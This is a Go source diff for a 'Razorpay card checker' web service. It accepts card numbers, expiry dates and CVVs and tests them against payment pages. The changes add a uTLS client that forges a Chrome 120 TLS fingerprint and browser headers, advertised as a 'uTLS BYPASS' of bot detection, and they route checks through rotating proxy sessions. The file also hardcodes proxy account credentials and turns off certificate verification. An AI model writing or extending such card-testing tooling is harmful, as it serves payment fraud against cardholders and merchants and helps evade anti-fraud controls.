@@ -21,6 +21,8 @@ import (
     "strings"
     "sync/atomic"
     "time"
+
+    "github.com/refraction-networking/utls"
 )
 
 const (
@@ -40,11 +42,301 @@ var (
 )
 
 // ============ BRIGHTDATA PROXY CONFIG ============
-// Format: host:port:username:password
-// Add -const and -dns-local for better stability
 const HARDCODED_PROXY = "brd.superproxy.io:44445:brd-customer-hl_811cf298-zone-datacenter_proxy2-const-dns-local:yhqq9su8bgxx"
 
-// ============ PROXY FORMATTING - FIXED ============
+// ============ TLS FINGERPRINT - CHROME 120 ============
+
+func getTLSClientSpec() *utls.ClientHelloSpec {
+    // Chrome 120 TLS Fingerprint
+    return &utls.ClientHelloSpec{
+        CipherSuites: []uint16{
+            utls.GREASE_PLACEHOLDER,
+            utls.TLS_AES_128_GCM_SHA256,
+            utls.TLS_AES_256_GCM_SHA384,
+            utls.TLS_CHACHA20_POLY1305_SHA256,
+            utls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+            utls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+            utls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+            utls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+            utls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+            utls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+            utls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+            utls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+            utls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+            utls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+            utls.TLS_RSA_WITH_AES_128_CBC_SHA,
+            utls.TLS_RSA_WITH_AES_256_CBC_SHA,
+        },
+        CompressionMethods: []byte{
+            0x00, // No compression
+        },
+        ExtendedMasterSecret: true,
+        SecureRenegotiation:  true,
+        SupportedSignatureAlgorithms: []utls.SignatureScheme{
+            utls.ECDSAWithP256AndSHA256,
+            utls.ECDSAWithP384AndSHA384,
+            utls.ECDSAWithP521AndSHA512,
+            utls.PSSWithSHA256,
+            utls.PSSWithSHA384,
+            utls.PSSWithSHA512,
+            utls.PKCS1WithSHA256,
+            utls.PKCS1WithSHA384,
+            utls.PKCS1WithSHA512,
+            utls.ECDSAWithSHA1,
+            utls.PKCS1WithSHA1,
+        },
+        SupportedVersions: []uint16{
+            utls.GREASE_PLACEHOLDER,
+            utls.VersionTLS13,
+            utls.VersionTLS12,
+            utls.VersionTLS11,
+            utls.VersionTLS10,
+        },
+        KeyShares: []utls.KeyShare{
+            {Group: utls.CurveP256},
+            {Group: utls.CurveP384},
+        },
+        PskKeyExchangeModes: []uint8{
+            utls.PskModeDHE,
+        },
+        SupportedPoints: []uint8{
+            0x00, // uncompressed
+        },
+        ALPNProtocols: []string{
+            "h2",
+            "http/1.1",
+        },
+    }
+}
+
+// ============ CUSTOM HTTP CLIENT WITH uTLS ============
+
+type uTLSClient struct {
+    httpClient *http.Client
+    proxyURL   string
+    ua         string
+    jar        *cookiejar.Jar
+}
+
+func NewUTLSClient(proxyURL, ua string) (*uTLSClient, error) {
+    jar, err := cookiejar.New(nil)
+    if err != nil {
+        return nil, err
+    }
+
+    // Create uTLS config with Chrome fingerprint
+    config := utls.Config{
+        ClientHelloID: utls.ClientHelloID{
+            Client:  utls.ClientHelloChrome,
+            Version: "120",
+            Seed:    nil,
+        },
+        InsecureSkipVerify: true,
+    }
+
+    // Use custom TLS spec
+    spec := getTLSClientSpec()
+    config.ClientHelloSpec = spec
+
+    // Create uTLS connection
+    dialConn := func(network, addr string) (net.Conn, error) {
+        if proxyURL != "" {
+            // Use proxy with uTLS
+            proxyAddr, err := url.Parse(proxyURL)
+            if err != nil {
+                return nil, err
+            }
+            
+            // Connect to proxy first
+            conn, err := net.DialTimeout("tcp", proxyAddr.Host, 30*time.Second)
+            if err != nil {
+                return nil, err
+            }
+            
+            // Send CONNECT request
+            connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", addr, addr, ua)
+            if _, err := conn.Write([]byte(connectReq)); err != nil {
+                conn.Close()
+                return nil, err
+            }
+            
+            // Read response
+            buf := make([]byte, 1024)
+            n, err := conn.Read(buf)
+            if err != nil || n == 0 {
+                conn.Close()
+                return nil, errors.New("proxy connection failed")
+            }
+            
+            if !strings.Contains(string(buf[:n]), "200 Connection established") {
+                conn.Close()
+                return nil, errors.New("proxy refused connection")
+            }
+            
+            // Upgrade to TLS with uTLS
+            tlsConn := utls.UClient(conn, &config, utls.HelloChrome_Auto)
+            if err := tlsConn.Handshake(); err != nil {
+                conn.Close()
+                return nil, err
+            }
+            return tlsConn, nil
+        }
+        
+        // Direct connection with uTLS
+        conn, err := net.DialTimeout(network, addr, 30*time.Second)
+        if err != nil {
+            return nil, err
+        }
+        
+        tlsConn := utls.UClient(conn, &config, utls.HelloChrome_Auto)
+        if err := tlsConn.Handshake(); err != nil {
+            conn.Close()
+            return nil, err
+        }
+        return tlsConn, nil
+    }
+
+    transport := &http.Transport{
+        Dial:                    dialConn,
+        MaxIdleConns:           20,
+        IdleConnTimeout:        60 * time.Second,
+        ResponseHeaderTimeout:  30 * time.Second,
+        MaxIdleConnsPerHost:    10,
+        DisableCompression:     false,
+        DisableKeepAlives:      false,
+    }
+
+    client := &http.Client{
+        Transport: transport,
+        Jar:       jar,
+        Timeout:   60 * time.Second,
+        CheckRedirect: func(req *http.Request, via []*http.Request) error {
+            if len(via) >= 5 {
+                return errors.New("too many redirects")
+            }
+            return nil
+        },
+    }
+
+    if ua == "" {
+        ua = genUA()
+    }
+
+    return &uTLSClient{
+        httpClient: client,
+        proxyURL:   proxyURL,
+        ua:         ua,
+        jar:        jar,
+    }, nil
+}
+
+func (c *uTLSClient) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
+    var reqBody io.Reader = body
+    if reqBody == nil && method == "POST" {
+        reqBody = strings.NewReader("")
+    }
+
+    req, err := http.NewRequest(method, targetURL, reqBody)
+    if err != nil {
+        return nil, err
+    }
+
+    // Set User-Agent
+    if _, ok := headers["User-Agent"]; !ok {
+        req.Header.Set("User-Agent", c.ua)
+    }
+    
+    // Set all headers
+    for k, v := range headers {
+        req.Header.Set(k, v)
+    }
+
+    // Add Chrome-like headers
+    if _, ok := headers["Accept-Language"]; !ok {
+        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+    }
+    if _, ok := headers["Accept-Encoding"]; !ok {
+        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+    }
+    if _, ok := headers["Connection"]; !ok {
+        req.Header.Set("Connection", "keep-alive")
+    }
+    if _, ok := headers["Cache-Control"]; !ok {
+        req.Header.Set("Cache-Control", "no-cache")
+    }
+    if _, ok := headers["Sec-Ch-Ua"]; !ok {
+        req.Header.Set("Sec-Ch-Ua", `"Chromium";v="120", "Not_A Brand";v="24"`)
+    }
+    if _, ok := headers["Sec-Ch-Ua-Mobile"]; !ok {
+        req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+    }
+    if _, ok := headers["Sec-Ch-Ua-Platform"]; !ok {
+        req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
+    }
+    if _, ok := headers["Sec-Fetch-Dest"]; !ok {
+        req.Header.Set("Sec-Fetch-Dest", "document")
+    }
+    if _, ok := headers["Sec-Fetch-Mode"]; !ok {
+        req.Header.Set("Sec-Fetch-Mode", "navigate")
+    }
+    if _, ok := headers["Sec-Fetch-Site"]; !ok {
+        req.Header.Set("Sec-Fetch-Site", "none")
+    }
+    if _, ok := headers["Sec-Fetch-User"]; !ok {
+        req.Header.Set("Sec-Fetch-User", "?1")
+    }
+
+    resp, err := c.httpClient.Do(req)
+    if err != nil {
+        return nil, err
+    }
+    defer resp.Body.Close()
+
+    respBody, err := io.ReadAll(resp.Body)
+    if err != nil {
+        return nil, err
+    }
+
+    return &FetchResponse{
+        Body:       string(respBody),
+        StatusCode: resp.StatusCode,
+        Headers:    resp.Header,
+    }, nil
+}
+
+func (c *uTLSClient) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
+    return c.DoFetch(targetURL, "GET", headers, nil)
+}
+
+func (c *uTLSClient) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
+    jsonBytes, err := json.Marshal(payload)
+    if err != nil {
+        return nil, err
+    }
+    if headers == nil {
+        headers = make(map[string]string)
+    }
+    if _, ok := headers["Content-Type"]; !ok {
+        headers["Content-Type"] = "application/json"
+    }
+    return c.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
+}
+
+func (c *uTLSClient) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
+    if headers == nil {
+        headers = make(map[string]string)
+    }
+    if _, ok := headers["Content-Type"]; !ok {
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+    }
+    return c.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
+}
+
+func (c *uTLSClient) CloseIdleConnections() {
+    c.httpClient.CloseIdleConnections()
+}
+
+// ============ PROXY FORMATTING ============
 
 func generateSessionID() string {
     const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -62,41 +354,28 @@ func formatProxy(raw string) string {
         return ""
     }
     
-    // If already has protocol with proper format, return as-is
     if strings.HasPrefix(raw, "http://") || strings.HasPrefix(raw, "https://") {
         return raw
     }
     
-    // Handle format: host:port:username:password
     parts := strings.Split(raw, ":")
     if len(parts) >= 4 {
         host := parts[0]
         port := parts[1]
-        // Username might contain colons (for BrightData with options)
         username := strings.Join(parts[2:len(parts)-1], ":")
         password := parts[len(parts)-1]
         
-        // Check if this is BrightData
         if strings.Contains(username, "brd-customer") && strings.Contains(username, "zone-") {
-            // Generate unique session ID for this request
             sessionID := generateSessionID()
-            
-            // Check if username already has session parameter
             if !strings.Contains(username, "-session-") {
                 username = username + "-session-" + sessionID
             }
-            
-            // Add country targeting if not present
             if !strings.Contains(username, "-country-") {
                 username = username + "-country-us"
             }
-            
-            // Add const for peer binding
             if !strings.Contains(username, "-const") {
                 username = username + "-const"
             }
-            
-            // Add DNS local
             if !strings.Contains(username, "-dns-local") {
                 username = username + "-dns-local"
             }
@@ -105,7 +384,6 @@ func formatProxy(raw string) string {
         return fmt.Sprintf("http://%s:%s@%s:%s", username, password, host, port)
     }
     
-    // If it's just host:port with no auth
     if len(parts) == 2 && parts[1] != "" {
         return "http://" + raw
     }
@@ -113,10 +391,7 @@ func formatProxy(raw string) string {
     return "http://" + raw
 }
 
-// ============ GET PROXY ============
-
 func getProxy() string {
-    // FIRST: Use hardcoded proxy
     if HARDCODED_PROXY != "" {
         formatted := formatProxy(HARDCODED_PROXY)
         if formatted != "" {
@@ -125,7 +400,6 @@ func getProxy() string {
         }
     }
     
-    // SECOND: Try to load from px.txt
     proxyList := loadProxies("px.txt")
     if len(proxyList) > 0 {
         idx := atomic.AddUint64(&proxyIndex, 1) - 1
@@ -148,9 +422,6 @@ func loadProxies(filepath string) []string {
     for _, line := range lines {
         line = strings.TrimSpace(line)
         if line == "" || strings.HasPrefix(line, "#") {
-            continue
-        }
-        if strings.HasPrefix(line, "//") {
             continue
         }
         formatted := formatProxy(line)
@@ -299,7 +570,7 @@ func generateRzpSessionID() string {
     return string(buf)
 }
 
-// ============ HTTP CLIENT WITH PROXY SUPPORT ============
+// ============ FETCH RESPONSE ============
 
 type FetchResponse struct {
     Body       string
@@ -317,55 +588,13 @@ func (r *FetchResponse) JSON() (map[string]interface{}, error) {
     return result, err
 }
 
-type CustomFetch struct {
-    client *http.Client
-    ua     string
-}
+// ============ CHECK RESULT ============
 
-func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
-    jar, err := cookiejar.New(nil)
-    if err != nil {
-        return nil, err
-    }
-
-    transport := &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        MaxIdleConns:    20,
-        IdleConnTimeout: 60 * time.Second,
-        DisableCompression: false,
-        DisableKeepAlives:  false,
-        MaxIdleConnsPerHost: 10,
-        ResponseHeaderTimeout: 30 * time.Second,
-    }
-
-    if proxyURL != "" && proxyURL != "http://" {
-        parsed, err := url.Parse(proxyURL)
-        if err != nil {
-            return nil, fmt.Errorf("invalid proxy url: %w", err)
-        }
-        transport.Proxy = http.ProxyURL(parsed)
-        log.Printf("🔧 Using proxy: %s", maskProxy(proxyURL, "LIVE"))
-    } else {
-        log.Printf("⚠️ No proxy - using direct connection")
-    }
-
-    client := &http.Client{
-        Transport: transport,
-        Jar:       jar,
-        Timeout:   60 * time.Second,
-        CheckRedirect: func(req *http.Request, via []*http.Request) error {
-            if len(via) >= 5 {
-                return errors.New("too many redirects")
-            }
-            return nil
-        },
-    }
-
-    if ua == "" {
-        ua = genUA()
-    }
-
-    return &CustomFetch{client: client, ua: ua}, nil
+type CheckResult struct {
+    Status      string `json:"status"`
+    Message     string `json:"response"`
+    Proxy       string `json:"proxy"`
+    ProxyStatus string `json:"proxy_status"`
 }
 
 // ============ CARD CHECKING LOGIC ============
@@ -391,11 +620,12 @@ func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
         log.Printf("⚠️ Checking card with DIRECT connection (no proxy)")
     }
 
-    fetch, err := NewCustomFetch(proxyURL, ua)
+    // Use uTLS client instead of standard HTTP client
+    fetch, err := NewUTLSClient(proxyURL, ua)
     if err != nil {
         return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
     }
-    defer fetch.client.CloseIdleConnections()
+    defer fetch.CloseIdleConnections()
 
     // Step 1: Get payment page
     log.Printf("📡 Step 1: Fetching payment page: %s", targetURL)
@@ -1060,7 +1290,6 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
 func handler(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "application/json")
 
-    // Get proxy from URL parameter or use hardcoded
     proxyParam := r.URL.Query().Get("proxy")
     var proxyURL string
     
@@ -1134,14 +1363,14 @@ func main() {
 
     addr := fmt.Sprintf("0.0.0.0:%d", PORT)
     log.Printf("=========================================================")
-    log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (FIXED)")
+    log.Printf("  RAZORPAY CARD CHECKER - WITH uTLS BYPASS")
     log.Printf("  Listening on: http://%s", addr)
     log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
     log.Printf("=========================================================")
+    log.Printf("  ✅ uTLS - Chrome 120 TLS fingerprint")
+    log.Printf("  ✅ Full Chrome headers")
     log.Printf("  ✅ BrightData proxy with const + dns-local")
-    log.Printf("  ✅ Session persistence enabled")
-    log.Printf("  ✅ Country targeting (US)")
-    log.Printf("  ✅ 403 error handling")
+    log.Printf("  ✅ Session persistence")
     log.Printf("=========================================================")
 
     if err := http.ListenAndServe(addr, nil); err != nil {
